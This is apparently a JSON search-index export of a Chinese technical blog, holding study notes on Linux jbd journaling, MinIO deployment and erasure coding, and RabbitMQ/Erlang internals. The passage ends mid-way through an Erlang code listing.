[{"title":"journal block device","url":"/2021/04/27/journal block device/","content":"\n\n\n## journal block device\n\n### 介绍\n\n### jbd是如何解决问题\n\n- 提到一致性，大家会想到数据库里面的事务的概念，事务有四个基本属性\n\n1. 原子性\n   事务必须是原子工作单元；对于其数据修改，要么全部执行，要么全都不执行。\n2. 一致性\n   事务在完成时，必须使所有的数据都保持一致状态。\n3. 隔离性\n   由并发事务所做的修改必须与任何其他并发事务所做的修改隔离。事务识别数据时数据所处的状态，要么是另一并发事务修改它之前的状态，要么是第二个事务修改它之后的状态，事务不会识别中间状态的数据。\n4. 持久性\n   事务完成之后，他对于系统的影响是永久性的。该修改即使出现系统故障也将一直保持。\n\n- 文件系统的开发者借用了数据库中事务的思想，将其应用于文件系统上，以期保证对文件系统操作的原子性、隔离性，尽量使文件系统处于一致性。\n\n##### 在磁盘上单独划分一个日志空间\n\n- 日志，在这里指的是磁盘上存储事务数据的那个地方，即若干磁盘块。它可以以一个单独的文件形式存在，也可以由文件系统预留一个inode和一些磁盘块，也可以是单独的磁盘分区。总之就是磁盘上存储事务数据的那个地方。\n- 提到日志时，可能还有另外一种含义，就是它是一种机制，用于管理内存中的缓存区、事务、磁盘日志数据读写等等所有这一切，统称为日志。读者注意根据上下文进行区分。\n\n##### 将内存事务的数据写到日志中\n\n- 文件系统可以选择定期（每隔5秒，或用户指定的时间间隔）或者立即将内存中的事务数据写到磁盘日志上，以备发生系统崩溃后可以利用日志中的数据恢复，重新使文件系统保持一致的状态。\n- 这个间隔时间的选取，要注意性能的平衡。时间间隔越短，文件系统丢失数据的可能性就越少，一致性的时间点就越新，但是IO负担就越重，很可能就会影响系统的性能。反过来，时间间隔越大，文件系统丢失的数据可能就越多，一致性的时间点就越旧。但是IO负担就比较轻，不太会影响系统的性能。\n\n##### 文件系统某些操作抽象成原子操作\n\n- 所谓原子操作，就是内部不再分割的操作，该操作要么完全完成，要么根本没有执行，不存在部分完成的状态。\n- 那么，什么样的操作可以看成对文件系统的原子操作呢？往一个磁盘文件中追加写入1MB字节可以看成一个原子操作么？这个操作其实比较大，因为要写1MB的数据，要为文件分配1024个磁盘块，同时还要分配若干个索引块，也会涉及到很多的磁盘块位图、块组块的读写，非常复杂，时间也会比较长，中间出问题的机会就比较多，所以不适宜看做一个原子操作。\n- 那么，什么样的操作可以看成对文件系统的原子操作呢？比如说为文件分配一个磁盘块，就看成一个原子操作就比较合适。分配一个磁盘块，可能需要修改一个inode块、一个磁盘块位图、最多三个间接索引块、块组块、超级块，一共最多7个磁盘块。将分配一个磁盘块看成一个原子操作，意味着上述修改7个磁盘块的操作要么都成功，要么都失败，不可能有第三种状态。\n\n##### 若干个原子操作组成一个事务\n\n- 实现日志文件系统时，可以将一个原子操作就作为一个事务来处理，但是这样实现的效率比较低。于是ext3将若干个原子操作组合成一个事务，对磁盘日志以事务为单位进行管理，以提高读写日志的效率。\n\n##### 从日志恢复数据\n\n- jbd的思想就是原来内核读写磁盘的逻辑保持不变，但是对于影响文件系统一致性的数据块（即元数据块，第四章会详细解释），及时地写到磁盘上的日志空间中去。这样，即使系统崩溃了，也能从日志中恢复数据，确保文件系统的一致性。如错误！未找到引用源。，其中绿色的箭头表示正常的磁盘读写，紫色的箭头表示由jbd将元数据块额外写一份到磁盘日志中，红色箭头表示恢复时，由jbd将日志中的数据写回磁盘的原始位置。\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2019012111422743.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzIyNjEzNzU3,size_16,color_FFFFFF,t_70)\n\n\n\n补习linux 文件系统知识\n\n\n\n### 参考资料\n\nhttps://blog.csdn.net/qq_22613757/article/details/86571646","tags":["学习笔记"],"categories":["学习笔记"]},{"title":"minio存储","url":"/2021/04/27/miniIO/","content":"\n## minio存储\n\n### 部署安装\n\n源码安装\n\n```shell\ngit clone http://github.com/minio/minio\n```\n\ngoland打开\n\n```shell\ngo run main.go\n```\n\n### 启动\n\n```shell\ngo run main.go server data1 data2 data3 data4 data5 data6 data7 data8\n```\n\n浏览器访问\n\n```shell\nhttp://127.0.0.1:9000\n```\n\n### SDK\n\ngolang client：\n\n```go\npackage main\n\nimport (\n\t\"context\"\n\t\"github.com/minio/minio-go/v7\"\n\t\"github.com/minio/minio-go/v7/pkg/credentials\"\n\t\"log\"\n)\n\nfunc main() {\n\tctx := context.Background()\n\tendpoint := \"10.51.30.214:9000\"\n\taccessKeyID := \"minioadmin\"\n\tsecretAccessKey := \"minioadmin\"\n\tuseSSL := false\n\n\t// Initialize minio client object.\n\tminioClient, err := minio.New(endpoint, &minio.Options{\n\t\tCreds:  credentials.NewStaticV4(accessKeyID, secretAccessKey, \"\"),\n\t\tSecure: useSSL,\n\t})\n\tif err != nil {\n\t\tlog.Fatalln(err)\n\t}\n\n\tlog.Printf(\"%#v\\n\", minioClient) // minioClient is now set up\n\n\t// Make a new bucket called mymusic.\n\tbucketName := \"mymusic\"\n\tlocation := \"us-east-1\"\n\n\terr = minioClient.MakeBucket(ctx, bucketName, minio.MakeBucketOptions{Region: location})\n\tif err != nil {\n\t\t// Check to see if we already own this bucket (which happens if you run this twice)\n\t\texists, errBucketExists := minioClient.BucketExists(ctx, bucketName)\n\t\tif errBucketExists == nil && exists {\n\t\t\tlog.Printf(\"We already own %s\\n\", bucketName)\n\t\t} else {\n\t\t\tlog.Fatalln(err)\n\t\t}\n\t} else {\n\t\tlog.Printf(\"Successfully created %s\\n\", bucketName)\n\t}\n\n\t// Upload the zip file\n\tobjectName := \"aaa.zip\"\n\tfilePath := \"aaa.zip\"\n\tcontentType := \"application/zip\"\n\n\t// Upload the zip file with FPutObject\n\tn, err := minioClient.FPutObject(ctx, bucketName, objectName, filePath, minio.PutObjectOptions{ContentType: contentType})\n\tif err != nil {\n\t\tlog.Fatalln(err)\n\t}\n\n\tlog.Printf(\"Successfully uploaded %s of size %d\\n\", objectName, n)\n}\n```\n\n### 对接k8s\n\n安装\n\n```shell\nkubectl krew update\nkubectl krew install minio\nkubectl minio init\n```\n\n创建新租户\n\n配置至少16个pv\n\n```shell\n kubectl minio tenant create minio-tenant-1 \\\n      --servers 4                             \\\n      --volumes 16                            \\\n      --capacity 16Ti                         \\\n      --namespace minio-tenant-1              \\\n      --storageClassName local-storage        \\\n```\n\n设置默认的存储StorageClass\n\n```shell\napiVersion: storage.k8s.io/v1\nkind: StorageClass\nmetadata:\n    name: local-storage\nprovisioner: kubernetes.io/no-provisioner\nvolumeBindingMode: WaitForFirstConsumer\n```\n\ndocker-compose部署minio:\n\ndocker-compose 文件如下：\n\n```shell\nversion: '3.7'\n\n# starts 4 docker containers running minio server instances.\n# using nginx reverse proxy, load balancing, you can access\n# it through port 9000.\nservices:\n  minio1:\n    image: minio/minio:RELEASE.2021-01-05T05-22-38Z\n    volumes:\n      - data1-1:/data1\n      - data1-2:/data2\n    expose:\n      - \"9000\"\n    environment:\n      MINIO_ROOT_USER: minio\n      MINIO_ROOT_PASSWORD: minio123\n    command: server http://minio{1...4}/data{1...2}\n    healthcheck:\n      test: [\"CMD\", \"curl\", \"-f\", \"http://localhost:9000/minio/health/live\"]\n      interval: 30s\n      timeout: 20s\n      retries: 3\n\n  minio2:\n    image: minio/minio:RELEASE.2021-01-05T05-22-38Z\n    volumes:\n      - data2-1:/data1\n      - data2-2:/data2\n    expose:\n      - \"9000\"\n    environment:\n      MINIO_ROOT_USER: minio\n      MINIO_ROOT_PASSWORD: minio123\n    command: server http://minio{1...4}/data{1...2}\n    healthcheck:\n      test: [\"CMD\", \"curl\", \"-f\", \"http://localhost:9000/minio/health/live\"]\n      interval: 30s\n      timeout: 20s\n      retries: 3\n\n  minio3:\n    image: minio/minio:RELEASE.2021-01-05T05-22-38Z\n    volumes:\n      - data3-1:/data1\n      - data3-2:/data2\n    expose:\n      - \"9000\"\n    environment:\n      MINIO_ROOT_USER: minio\n      MINIO_ROOT_PASSWORD: minio123\n    command: server http://minio{1...4}/data{1...2}\n    healthcheck:\n      test: [\"CMD\", \"curl\", \"-f\", \"http://localhost:9000/minio/health/live\"]\n      interval: 30s\n      timeout: 20s\n      retries: 3\n\n  minio4:\n    image: minio/minio:RELEASE.2021-01-05T05-22-38Z\n    volumes:\n      - data4-1:/data1\n      - data4-2:/data2\n    expose:\n      - \"9000\"\n    environment:\n      MINIO_ROOT_USER: minio\n      MINIO_ROOT_PASSWORD: minio123\n    command: server http://minio{1...4}/data{1...2}\n    healthcheck:\n      test: [\"CMD\", \"curl\", \"-f\", \"http://localhost:9000/minio/health/live\"]\n      interval: 30s\n      timeout: 20s\n      retries: 3\n\n  nginx:\n    image: nginx:1.19.2-alpine\n    volumes:\n      - ./nginx.conf:/etc/nginx/nginx.conf:ro\n    ports:\n      - \"9000:9000\"\n    depends_on:\n      - minio1\n      - minio2\n      - minio3\n      - minio4\n\n## By default this config uses default local driver,\n## For custom volumes replace with volume driver configuration.\nvolumes:\n  data1-1:\n  data1-2:\n  data2-1:\n  data2-2:\n  data3-1:\n  data3-2:\n  data4-1:\n  data4-2:\n```\n\n执行启动minio\n\n```shell\ndocker-compose pull\ndocker-compose up -d\n```\n\n\n\n### 原理\n\n特点：\n\n高性能：作为高性能对象存储，在标准硬件条件下它能达到55GB/s的读、35GG/s的写速率\n\n可扩容：不同MinIO集群可以组成联邦，并形成一个全局的命名空间，并跨越多个数据中心\n\n云原生：容器化、基于K8S的编排、多租户支持\n\nAmazon S3兼容：Minio使用Amazon S3 v2 / v4 API。可以使用Minio SDK，Minio Client，AWS SDK和AWS CLI访问Minio服务器。\n\n可对接后端存储: 除了Minio自己的文件系统，还支持DAS、 JBODs、NAS、Google云存储和Azure Blob存储。\n\nSDK支持: 基于Minio轻量的特点，它得到类似Java、Python或Go等语言的sdk支持\n\nLambda计算: Minio服务器通过其兼容AWS SNS / SQS的事件通知服务触发Lambda功能。支持的目标是消息队列，如Kafka，NATS，AMQP，MQTT，Webhooks以及Elasticsearch，Redis，Postgres和MySQL等数据库。\n\n有操作页面\n\n功能简单: 这一设计原则让MinIO不容易出错、更快启动\n\n支持纠删码：MinIO使用纠删码、Checksum来防止硬件错误和静默数据污染。在最高冗余度配置下，即使丢失1/2的磁盘也能恢复数据\n\nErasure Code\n\n副本（Replication）策略：\n\n副本，实打实的复制，常见的是三副本，意味着现实世界有三份一样的数据。代价稍高，偏计算类的场景基本都会用该策略，比如虚拟机VM、数据库。如果一个副本挂了，马上切到另外一个，漂移时间非常短。n副本存储效率永远是1/n。\n\n纠删码（Erasure Code）策略：\n\n纠删码，会把数据进行切分，同时计算校验块。以常见的reedsolomon（RS）纠删码为例，在6*数据块+3*校验块的情景，可以允许3个块（任意数据块+校验块数量之和为3）损坏。在偏纯存储的场景会用到，例如对象存储。n数据块+m校验块的纠删码配置，存储效率是n/n+m， 但是在重构（Reconstruct）的时候，需要消耗cpu资源，而且有一定延时。\n\nminio是一个对象存储服务，存储考虑的是低成本+高可用，其纠删码使用的是RS纠删码，对应的github仓库是\n[github.com/klauspost/reedsolomon](https://github.com/klauspost/reedsolomon)\n单核恢复能力超过1GB/s, 特定平台可以通过指令加速。\n\nMinio采用Reed-Solomon code将对象拆分成N/2数据和N/2 奇偶校验块。 这就意味着如果是12块盘，一个对象会被分成6个数据块、6个奇偶校验块，你可以丢失任意6块盘（不管其是存放的数据块还是奇偶校验块），你仍可以从剩下的盘中的数据进行恢复。\n\n位衰减又被称为数据腐化`Data Rot`、无声数据损坏`Silent Data Corruption`,是目前硬盘数据的一种严重数据丢失问题。硬盘上的数据可能会神不知鬼不觉就损坏了，也没有什么错误日志。正所谓明枪易躲，暗箭难防，这种背地里犯的错比硬盘直接咔咔宕了还危险。 不过不用怕，Minio纠删码采用了高速[BLAKE2](https://blog.minio.io/accelerating-blake2b-by-4x-using-simd-in-go-assembly-33ef16c8a56b#.jrp1fdwer) 基于哈希的校验和来防范位衰减。\n\n[BLAKE2](https://blog.minio.io/accelerating-blake2b-by-4x-using-simd-in-go-assembly-33ef16c8a56b#.jrp1fdwer)\n\nBLAKE算法于2008年提出，它包含两个版本，一种基于32位word用于产生最长256位的哈希结果，一种基于64位word用于产生最长512位的哈希结果，BLAKE算法核心操作是不断地将8个散列中间结果和16个输入word进行组合，从而产生下一轮组合的8个中间结果。按照最终截断的哈希长度，BLAKE-256和BLAKE-224使用32位字分别产生256位和224位的哈希结果（也称消息摘要），而BLAKE-512和BLAKE-384使用64位字并产生512位和384位哈希结果。\n\nBLAKE2算法基于BLAKE算法，于2012年被提出，BLAKE2不再向blake round函数中对输入字添加常量，修改了两个旋转常量及padding等，并在BLAKE2b（对应BLAKE-512）中将rounds的数量由16减少为12，在BLAKE2s（对应BLAKE-256）中将rounds数量由14减少为10，同样的，BLAKE2b产生1到64字节的消息摘要，BLAKE2s产生1到32字节的消息摘要，同时这两种算法也由对应的多核并行版本BLAKE2bp（4路并行）和BLAKE2sp（8路并行）。除了以上几种算法变种，BLAKE2还有一种BLAKE2x的变种，这种算法可以产生任意长度的消息摘要，详情请参考[相应文档](https://blake2.net/blake2x.pdf)。除了安全性方面的优势，据称BLAKE2算法在Intel CPU第六代微处理架构（Skylake）中的处理速度要优于MD5，SHA-1，SHA-2和SHA-3等算法\n\nBLAKE系列算法被广泛应用于区块链数字货币领域，下面介绍3中典型数字货币：\n\n1 decred\n以blake256为核心哈希算法，其主页为：https://decred.org/\n\n2 sia\n以blake2b为核心哈希算法，其主页为：https://sia.tech/\n\n3 verge\n以blake2s为核心哈希算法，其主页为：https://vergecurrency.com/\n\n至于具体哈希算法在各个币种应用细节，请参考相关钱包的源代码。\n\n\n\n### 总结\n\n继续学习\n\n\n\n### 参考资料\n\nhttps://www.jianshu.com/p/c2b43ff67df0\n\n","tags":["存储"],"categories":["存储"]},{"title":"rabbitmq源码学习二","url":"/2021/01/28/rabbitmq源码分析2/","content":"\n## rabbitmq 源码分析二\n\n### 概念\n\nOTP代表Open Telecom Platform，开放电信平台。\n\n### erlang的存储\n\nets和dets是两个erlang中的系统模块，用于存储海量的erlang数据。ETS是Erlang Term Storage的缩写，DETS则是Disk ETS的缩写。\n\nETS和DETS提供健和值的查询表。ETS常驻内存，DETS则常驻磁盘。\n\nETS表内部使用散列表标识，也就是平衡二叉树。\n\nETS不会进行垃圾收集，也就是表中存储了海量的数据也不会产生垃圾收集的开销。\n\nDETS的最大的文件大小是2G。\n\n### rabbitmq中的mnesia\n\nmnesia是用erlang编写的数据库，用于高要求的电信应用程序，支持事务。\n\nmnesia是基于Erlang的分布式数据库管理系统，是Erlang OTP的重要组件。\n\nmnesia数据库被组织为一个表的集合，每个表由记录(通常被定义为Erlang Record)构成，表本身也包含一些属性，如类型，位置和持久性。这种表集合和记录的概念，和ets表很类似。事实上，mnesia中的数据在节点内就是以ets表存储的。因此，mnesia实际上是一个分布式的ets。\n\nmnesia中的表在节点内有三种存储形式：\n\n- `ram_copies`: 表仅存储于内存，可通过`mnesia:dump_tables(TabList)`来将数据导入到硬盘。\n- `disc_copies`: 表存储于内存中，但同时拥有磁盘备份，对表的写操作会分为两步：1.将写操作写入日志文件 2. 对内存中的表执行写操作\n- `disc_only_copies`: 表仅存储于磁盘中，对表的读写将会更慢，但是不会占用内存\n\n表的存储形式可以在表的创建中指出，默认为ram_copies。也可以在创建表后通过`mnesia:change_table_copy_type/3`来修改。\n\n表的属性由`mnesia:create_table(Name, TableDef)`中的TableDef指定，TableDef是一个Tuple List，其中比较重要的属性有：\n\n- `type`: 表的类型，主要有set, ordered_set和bag三种。前两者要求key唯一，bag不要求key唯一，但要求至少有一个字段不同。另外set和bag通过哈希表实现，而ordered_set则使用其它数据结构(如红黑树)以对key排序。type属性默认为set。\n- `attributes`: 表中条目的字段，通常由record_info(fields, myrecord)得出，而myrecord一般则用作表名。\n- `local_content`: 标识该表是否为本地表，local_content属性为true的表将仅本地可见，不会共享到集群中。local_content默认为false。\n- `index`: 表的索引。\n- `ram_copies`: 指名该表在哪些节点上存储为ram_copies。默认值为[node()]。即新建表默认都存储为ram_copies。\n- `disc_copies`: 该表在哪些节点上存储为disc_copies。默认为[]。\n- `disc_only_copies`: 该表在哪些节点上存储为disc_only_copies。默认为[]。\n\nschema表是mnesia数据库一张特殊的表，又叫模式表。它记录数据库中其它表的信息，schema表只能有ram_copies或disc_copies两种存储形式。并且一旦schema表存储为ram_copies，那么该节点上的其它表，也将只能存储为ram_copies。\n\nmnesia需要schema表的初始化自身，可在mnesia启动前，通过`mnesia:create_schema/1`来创建一个disc_copies类型的schema表，如果不调用`mnesia:create_schema/1`，直接启动`mnesia:start/0`，默认生成一个ram_copies类型的schema表，此时我们称该mnesia节点为”无盘节点”，因为其所有表都不能存储于磁盘中。\n\nmnesia表由记录组成，记录第一个元素为是记录名，第二个元素为标识记录的键。{表名，键}可以唯一标识表中特定记录，又称为记录的对象标识(Oid)。\n\nmnesia要求表中所有的记录必须为同一个record的实例，前面的例子中，表名即为记录名，表字段则为记录的域。而实际上，记录名可以是但不一定是表名，记录名可通过record_name属性指出，没有指定table_name则记录名默认为create_table第一参数指定的表名。\n\n```\nmnesia:dirty_write(Record) ->\n    Tab = element(1, Record), \n    mnesia:dirty_write(Tab, Record). % 这里提取出表名，表名和表中记录原型实际上是分离的\n```\n\n表名和记录名不一致使我们可以定义多个以同一record的原型的table。\n\nmneisa的优势:\n\n- 与Erlang的完美契合，记录字段可以是任意Erlang Term，具备强大的描述能力\n- 和传统数据库一样，支持事务，索引，分片等特性\n- 分布式特性，表的存储类型和位置对应用透明，支持分布式事务\n- 强大的动态配置能力，包括集群的动态伸缩，表的动态配置，增删，转移，升级等\n\nmnesia缺点：\n\n- 多节点事务带来的开销，尽可能少使用事务(在逻辑上配合做处理)\n- mnesia全联通网络的维护开销，在使用时需要控制集群节点数量\n- 不适合存储大量数据，这会带来网络负载\n\n### gen_server\n\ngen_server代表的就是“行为模式”的一种，行为模式的目的在于为特定类型的进程提供一套模板。\n\n用来启动服务器的有`start/3`,`start/4`,`start_link/3`,`start_link/4`这四个函数。 使用这些start函数之后，就会产生一个新的进程，也就是一个gen_server服务器。这些 start函数的正常情况下返回值是`{ok,Pid}`，`Pid`就是这个新进程的进程号。 带link与不带的区别在于是否跟父进程建立链接，换种说法是，新启动的进程死掉后，会不会通知启动他的进程（父进程）。\n\nstart函数可以四个参数`(ServerName, Module, Args, Options)`：\n\n- 第一个参数`ServerName`是服务名， 是可以省掉的。具有相同服务名的模块在一个节点中只能启动一次，重复启动会报错，为 `{error, {already_started, Pid}}`。具有服务名的服务进程可以使用服务名来调用， 没有服务名的只能通过进程号pid来调用了。通常有名字的服务进程会使用模块名做为 服务名，即上面模板中定义的宏`-define(SERVER, ?MODULE)`，然后在需要使用服务名的 地方填入`?SERVER`.\n- 第二个参数`Module`是模块名，一般而言API和回调函数是写在同一个文件里的，所以就用 `?MODULE`，表示本模块的模块名。\n- 第三个参数`Args`是回调函数`init/1`的参数，会原封不动地传给`init/1`。\n- 第四个参数`Options`是一些选项，可以设置debug、超时等东西。\n\nstart对应的回调函数是`init/1`，一般来说是进行服务器启动后的一些初始化的工作， 并生成初始的状态State，正常返回是{ok, State}。这个State是贯穿整个服务器， 并把所有六个回调函数联系起来的纽带。它的值最初由`init/1`生成， 此后可以由三个handle函数修改，每次修改后又要放回返回值中， 供下一个被调用的handle函数使用。 如果`init/1`返回`ignore`或`{stop, Reason}`，则会中止服务器的启动。\n\n有一点细节要注意的是，API函数和回调函数虽然习惯上是写在同一个文件中，但执行函数 的进程却通常是不一样的。在上面的模板中，`start_link/0`中使用`self()`的话，显示的是调用者的进程号，而在`init/1`中使用`self()`的话，显示的是服务器的进程号。\n\n**使用服务器**\n\n三个handle开头的回调函数对应着三种不同的使用服务器的方式。如下：\n\n```\ngen_server:call     -------------   handle_call/3\ngen_server:cast     -------------   handle_cast/2\n用！向服务进程发消息   -------------   handle_info/2\n```\n\ncall是有返回值的调用；cast是无返回值的调用，即通知；而直接向服务器进程发的 消息则由handle_info处理。\n\ncall是有返回值的调用，也是所谓的同步调用，进程会在调用后一直等待直到回调函数返回为止。 它的函数形式是 `gen_server:call(ServerRef, Request, Timeout) -> Reply`，\n\n- 第一个参数`ServerRef`是被调用的服务器，可以是服务器名，或是服务器的pid。\n- 第二个参数`Request`会直接传给回调函数`handle_call。`\n- 最后一个参数`Timeout`是超时，是可以省略的，默认值是5秒。\n\ncall是用来指挥回调函数`handle_call/3`干活的。具体形式为 `handle_call(Request, From, State)`。\n\n- 第一个参数`Request`是由call传进来的，是写程序时关注和处理的重点。\n- 第二个参数`From`是gen_server传进来的，是调用的来源，也就是哪个进程执行了call。 `From`的形式是`{Pid, Ref}`，`Pid`是来源进程号，而`Ref`是调用的标识，每一次调用 都不一样，用以区别。有了Pid，在需要向来源进程发送消息时就可以使用，但由于call 是有返回值的，一般使用返回值传递数据就好。\n- 第三个参数`State`是服务器的状态，这是由init或是其他的handle函数生成的，可以根据需要进 行修改之后，再放回返回值中。\n\n**call**\n\ncall对应的回调函数`handle_call/3`在正常情况下的返回值是`{reply, Reply, NewState}`， `Reply`会作为call的返回值传递回去，`NewState`则会作为服务器的状态。 另外还可以使用`{stop, Reason, State}`中止服务器运行，这比较少用。\n\n使用call要小心的是，**两个服务器进程不能互相call**，不然会死锁。\n\n### cast\n\ncast是没有返回值的调用，一般把它叫做通知。它是一个“异步”的调用，调用后会直接收到 `ok`，无需等待回调函数执行完毕。\n\n它的形式是`gen_server:cast(ServerRef, Request)`。参数含义 与call相同。由于不需要等待返回，所以没必要设置超时，没有第三个参数。\n\n在多节点的情况下，可以用`abcast`，向各节点上的具有指定名字的服务进程发通知。 \n\ncast们对应的回调函数是`handle_cast/2`，具体为：`handle_cast(Msg, State)`。 第一个参数是由cast传进去的，第二个是服务器状态，和call类似，不多说。\n\n`handel_cast/2`的返回值通常是`{noreply, NewState}`，这可以用来改变服务器状态， 或是`{stop, Reason, NewState}`，这会停止服务器。通常来说，停止服务器的命令用 cast来实现比较多。\n\n停止服务器\n\n上面介绍的handle函数返回{stop,...}，就会使用回调函数`terminate/2`进行扫尾工作。 典型的如关闭已打开的资源、文件、网络连接，打log做记录，通知别的进程“我要死啦”， 或是“信春哥，满血复活”：利用传进来的状态State重新启动服务器。\n\n### 原生消息\n\n原生消息使用`handle_info/2`处理，具体为`handle_info(Info, State)`。其中Info是 发过来的消息的内容。回复和`handle_cast`是一样的。\n\n### sasl\n\nsasl 是系统架构支持库(System Architecture Support Libraries，简称SASL)，负责记录错误记录和过载保护。\n\nerlang应用都会启动一个sasl应用，sasl的一个重要功能便是可以记录系统进程相关日志，如进程启动、结束、崩溃错误等信息。sasl的日志功能是基于erlang自带的日志模块error_logger来实现的，sasl中定义了下面3个错误处理：\n\nsasl_report_tty_h:将日志输出到控制台\n\nsasl_report_file_h:将日志输出到单个文件\n\nerror_logger_mf_h:循环日志文件记录\n\n### cowboy\n\ncowboy 是一个小型的快速模块的HTTP服务器。它使用Erlang编写的。https://github.com/ninenines/cowboy\n\n\n\n### rabbit主流程\n\nrabbit application 模块启动过程：\n\n![image-20201119163102592](/images/image-20201119163102592.png)\n\n有点多。。。todo...\n\nrabbit按照有向无环图方式一步步启动:\n\n```erlang\n%% 按照有向图的拓扑排序启动进程\n%% pre_boot\n-rabbit_boot_step({pre_boot, [{description, \"rabbit boot start\"}]}).\n\n%% codec_correctness_check\n-rabbit_boot_step({codec_correctness_check,\n                   [{description, \"codec correctness check\"},\n                    {mfa,         {rabbit_binary_generator,\n                                   check_empty_frame_size,\n                                   []}},\n                    {requires,    pre_boot},\n                    {enables,     external_infrastructure}]}).\n\n%% rabbit_alarm currently starts memory and disk space monitors\n%% rabbit_alarm\n-rabbit_boot_step({rabbit_alarm,\n                   [{description, \"alarm handler\"},\n                    {mfa,         {rabbit_alarm, start, []}},\n                    {requires,    pre_boot},\n                    {enables,     external_infrastructure}]}).\n\n%% database\n-rabbit_boot_step({database,\n                   [{mfa,         {rabbit_mnesia, init, []}},\n                    {requires,    file_handle_cache},\n                    {enables,     external_infrastructure}]}).\n\n%% database_sync\n-rabbit_boot_step({database_sync,\n                   [{description, \"database sync\"},\n                    {mfa,         {rabbit_sup, start_child, [mnesia_sync]}},\n                    {requires,    database},\n                    {enables,     external_infrastructure}]}).\n\n%% file_handle_cache\n-rabbit_boot_step({file_handle_cache,\n                   [{description, \"file handle cache server\"},\n                    {mfa,         {rabbit, start_fhc, []}},\n                    %% FHC needs memory monitor to be running\n                    {requires,    rabbit_alarm},\n                    {enables,     worker_pool}]}).\n\n%% worker_pool\n-rabbit_boot_step({worker_pool,\n                   [{description, \"worker pool\"},\n                    {mfa,         {rabbit_sup, start_supervisor_child,\n                                   [worker_pool_sup]}},\n                    {requires,    pre_boot},\n                    {enables,     external_infrastructure}]}).\n\n%% external_infrastructure\n-rabbit_boot_step({external_infrastructure,\n                   [{description, \"external infrastructure ready\"}]}).\n\n%% rabbit_registry\n-rabbit_boot_step({rabbit_registry,\n                   [{description, \"plugin registry\"},\n                    {mfa,         {rabbit_sup, start_child,\n                                   [rabbit_registry]}},\n                    {requires,    external_infrastructure},\n                    {enables,     kernel_ready}]}).\n\n%% rabbit_event\n-rabbit_boot_step({rabbit_event,\n                   [{description, \"statistics event manager\"},\n                    {mfa,         {rabbit_sup, start_restartable_child,\n                                   [rabbit_event]}},\n                    {requires,    external_infrastructure},\n                    {enables,     kernel_ready}]}).\n\n%% kernel_ready\n-rabbit_boot_step({kernel_ready,\n                   [{description, \"kernel ready\"},\n                    {requires,    external_infrastructure}]}).\n\n%% rabbit_memory_monitor\n-rabbit_boot_step({rabbit_memory_monitor,\n                   [{description, \"memory monitor\"},\n                    {mfa,         {rabbit_sup, start_restartable_child,\n                                   [rabbit_memory_monitor]}},\n                    {requires,    rabbit_alarm},\n                    {enables,     core_initialized}]}).\n\n%% guid_generator\n-rabbit_boot_step({guid_generator,\n                   [{description, \"guid generator\"},\n                    {mfa,         {rabbit_sup, start_restartable_child,\n                                   [rabbit_guid]}},\n                    {requires,    kernel_ready},\n                    {enables,     core_initialized}]}).\n\n%% delegate_sup\n-rabbit_boot_step({delegate_sup,\n                   [{description, \"cluster delegate\"},\n                    {mfa,         {rabbit, boot_delegate, []}},\n                    {requires,    kernel_ready},\n                    {enables,     core_initialized}]}).\n\n%% rabbit_node_monitor\n-rabbit_boot_step({rabbit_node_monitor,\n                   [{description, \"node monitor\"},\n                    {mfa,         {rabbit_sup, start_restartable_child,\n                                   [rabbit_node_monitor]}},\n                    {requires,    [rabbit_alarm, guid_generator]},\n                    {enables,     core_initialized}]}).\n\n%% rabbit_epmd_monitor\n-rabbit_boot_step({rabbit_epmd_monitor,\n                   [{description, \"epmd monitor\"},\n                    {mfa,         {rabbit_sup, start_restartable_child,\n                                   [rabbit_epmd_monitor]}},\n                    {requires,    kernel_ready},\n                    {enables,     core_initialized}]}).\n\n%% core_initialized\n-rabbit_boot_step({core_initialized,\n                   [{description, \"core initialized\"},\n                    {requires,    kernel_ready}]}).\n\n%% empty_db_check\n-rabbit_boot_step({empty_db_check,\n                   [{description, \"empty DB check\"},\n                    {mfa,         {?MODULE, maybe_insert_default_data, []}},\n                    {requires,    core_initialized},\n                    {enables,     routing_ready}]}).\n\n%% recovery\n-rabbit_boot_step({recovery,\n                   [{description, \"exchange, queue and binding recovery\"},\n                    {mfa,         {rabbit, recover, []}},\n                    {requires,    core_initialized},\n                    {enables,     routing_ready}]}).\n\n%% mirrored_queues\n-rabbit_boot_step({mirrored_queues,\n                   [{description, \"adding mirrors to queues\"},\n                    {mfa,         {rabbit_mirror_queue_misc, on_node_up, []}},\n                    {requires,    recovery},\n                    {enables,     routing_ready}]}).\n\n%% routing_ready\n-rabbit_boot_step({routing_ready,\n                   [{description, \"message delivery logic ready\"},\n                    {requires,    core_initialized}]}).\n\n%% log_relay\n-rabbit_boot_step({log_relay,\n                   [{description, \"error log relay\"},\n                    {mfa,         {rabbit_sup, start_child,\n                                   [rabbit_error_logger_lifecycle,\n                                    supervised_lifecycle,\n                                    [rabbit_error_logger_lifecycle,\n                                     {rabbit_error_logger, start, []},\n                                     {rabbit_error_logger, stop,  []}]]}},\n                    {requires,    routing_ready},\n                    {enables,     networking}]}).\n\n%% direct_client\n-rabbit_boot_step({direct_client,\n                   [{description, \"direct client\"},\n                    {mfa,         {rabbit_direct, boot, []}},\n                    {requires,    log_relay}]}).\n\n%% networking\n-rabbit_boot_step({networking,\n                   [{mfa,         {rabbit_networking, boot, []}},\n                    {requires,    log_relay}]}).\n\n%% notify_cluster\n-rabbit_boot_step({notify_cluster,\n                   [{description, \"notify cluster nodes\"},\n                    {mfa,         {rabbit_node_monitor, notify_node_up, []}},\n                    {requires,    networking}]}).\n\n%% background_gc\n-rabbit_boot_step({background_gc,\n                   [{description, \"background garbage collection\"},\n                    {mfa,         {rabbit_sup, start_restartable_child,\n                                   [background_gc]}},\n                    {enables,     networking}]}).\n\n%%---------------------------------------------------------------------------\n```\n\n一个个看过去。。。\n\ncodec_correctness_check：\n\n执行rabbit_binary_generator:check_empty_frame_size()函数\n\n```erlang\n%% 检查空的Frame数据的正确性\ncheck_empty_frame_size() ->\n\t%% Intended to ensure that EMPTY_FRAME_SIZE is defined correctly.\n\t%% 旨在确保EMPTY_FRAME_SIZE正确定义\n\tcase iolist_size(create_frame(?FRAME_BODY, 0, <<>>)) of\n\t\t?EMPTY_FRAME_SIZE -> ok;\n\t\tComputedSize      -> exit({incorrect_empty_frame_size,\n\t\t\t\t\t\t\t\t   ComputedSize, 